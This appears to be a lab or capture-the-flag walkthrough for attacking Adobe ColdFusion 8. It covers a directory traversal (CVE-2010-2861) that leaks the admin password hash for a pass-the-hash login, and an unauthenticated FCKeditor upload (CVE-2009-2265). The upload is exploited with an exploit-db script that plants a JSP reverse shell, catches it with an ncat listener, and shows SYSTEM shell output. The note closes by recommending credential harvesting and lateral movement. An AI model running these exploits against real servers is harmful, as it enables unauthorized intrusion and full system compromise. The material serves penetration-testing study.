## Attacking ColdFusion
With ColdFusion 8 confirmed on the target, two distinct attack paths are available: a directory traversal that leaks the administrator password hash, and an unauthenticated RCE through the bundled FCKeditor component. Both are accessible without any prior credentials.

***
## Attack Path 1: Directory Traversal to Admin Password (CVE-2010-2861)
[CVE-2010-2861](https://nvd.nist.gov/vuln/detail/CVE-2010-2861) is an unauthenticated LFI in the `locale` parameter across multiple ColdFusion admin pages. The parameter is passed to a file inclusion function without sanitisation, allowing `../` traversal sequences to escape the web root. 

The vulnerable endpoints include:

- `/CFIDE/administrator/settings/mappings.cfm`
- `/CFIDE/administrator/logging/settings.cfm`
- `/CFIDE/administrator/datasources/index.cfm`
- `/CFIDE/administrator/enter.cfm`
### Exploit with Searchsploit
Pull and run the existing Python2 exploit:

```bash
searchsploit -p 14641
cp /usr/share/exploitdb/exploits/multiple/remote/14641.py .
python2 14641.py
```

```
usage: 14641.py <host> <port> <file_path>
```

Target the `password.properties` file, adjusting the traversal depth to match the ColdFusion 8 install path:

```bash
python2 14641.py 10.129.204.230 8500 "../../../../../../../../ColdFusion8/lib/password.properties"
```

```
trying /CFIDE/wizards/common/_logintowizard.cfm
------------------------------
#Wed Mar 22 20:53:51 EET 2017
rdspassword=0IA/F

The `password.properties` file stores the admin password as a SHA1 hash.  [rapid7](https://www.rapid7.com/db/modules/exploit/windows/http/coldfusion_fckeditor/) The file path varies by ColdFusion version:

| Version | Path |
|---|---|
| ColdFusion 6 | `CFusionMX/lib/password.properties` |
| ColdFusion 7 | `CFusionMX7/lib/password.properties` |
| ColdFusion 8 | `ColdFusion8/lib/password.properties` |


### Pass-the-Hash Login (No Cracking Required)
On ColdFusion 8, the admin login page computes `hex_hmac_sha1(salt, hex_sha1(password))` before submitting. Since the salt changes every 30 seconds, the authentication can be bypassed by injecting the raw SHA1 hash from `password.properties` directly into the password field before the JavaScript applies the HMAC transform.  This means cracking the hash is often not necessary. Use Burp Suite to intercept the login request and substitute the pre-hashed value. [gnucitizen](https://www.gnucitizen.org/blog/coldfusion-directory-traversal-faq-cve-2010-2861/)

***
## Attack Path 2: Unauthenticated RCE via FCKeditor File Upload (CVE-2009-2265)
[CVE-2009-2265](https://nvd.nist.gov/vuln/detail/CVE-2009-2265) affects Adobe ColdFusion 8.0.1 and earlier. The bundled FCKeditor rich text component exposes a file upload endpoint with no authentication check and no file type validation.  An attacker can upload a JSP webshell or reverse shell directly to a publicly accessible path on the server. [invicti](https://www.invicti.com/web-application-vulnerabilities/coldfusion-8-fckeditor-file-upload-vulnerability)

The vulnerable upload endpoint is:

```
/CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm?Command=FileUpload&Type=File&CurrentFolder=/<filename>.jsp%00
```

The null byte (`%00`) truncates the `.cfm` extension that the server appends, leaving the uploaded file with a `.jsp` extension that Tomcat will execute. [codewatch](https://codewatch.org/2013/12/07/manually-penetrating-the-fckedit-vulnerability-cve-2009-2265/)
### Automated Exploitation with Exploit-DB 50057
Pull the Python3 exploit and edit the variables at the bottom of the script:

```bash
searchsploit -p 50057
cp /usr/share/exploitdb/exploits/cfm/webapps/50057.py .
```

Edit the connection details in the script:

```python
lhost = '10.10.14.55'   # Your HTB VPN IP
lport = 4444             # Listener port
rhost = "10.129.247.30"  # Target IP
rport = 8500             # Target port
```

The script handles the full chain automatically: 

1. Generates a JSP reverse shell payload using `msfvenom`
2. Uploads it via the FCKeditor endpoint disguised as a `.txt` file with a null-byte path trick
3. Starts an `ncat` listener
4. Requests the uploaded `.jsp` file to trigger execution
5. Deletes the payload from disk

```bash
python3 50057.py
```

```
Generating a payload...
Payload size: 1497 bytes
Saved as: 1269fd7bd2b341fab6751ec31bbfb610.jsp

Sending request and printing response...
window.parent.OnUploadCompleted( 0, "/userfiles/file/1269fd7bd2b341fab6751ec31bbfb610.jsp/..." );

Listening for connection...
Executing the payload...
Ncat: Connection from 10.129.247.30:49866.
```

```
Microsoft Windows [Version 6.1.7600]
C:\ColdFusion8\runtime\bin>
```

The shell returns as the user running the ColdFusion service, which on Windows is frequently the `SYSTEM` account or a high-privilege local account.

The Metasploit module [exploit/windows/http/coldfusion_fckeditor](https://www.rapid7.com/db/modules/exploit/windows/http/coldfusion_fckeditor/) handles the same CVE if you prefer a framework-based approach. 

***
## ColdFusion 8 Attack Decision Tree
```
ColdFusion 8 confirmed on port 8500
        |
        +-- Attempt LFI via CVE-2010-2861
        |       |
        |       +-- password.properties retrieved?
        |               |
        |               +-- YES: pass hash into admin login via Burp
        |               +-- NO: check traversal depth and retry other endpoints
        |
        +-- Attempt unauthenticated RCE via CVE-2009-2265
                |
                +-- Run 50057.py with correct lhost/lport/rhost/rport
                +-- Shell returns as ColdFusion service user
```

> After gaining a shell, check `whoami` immediately. ColdFusion 8 on Windows Server 2008 commonly runs as `SYSTEM`, which means no privilege escalation is needed and you can move directly to credential harvesting and lateral movement.
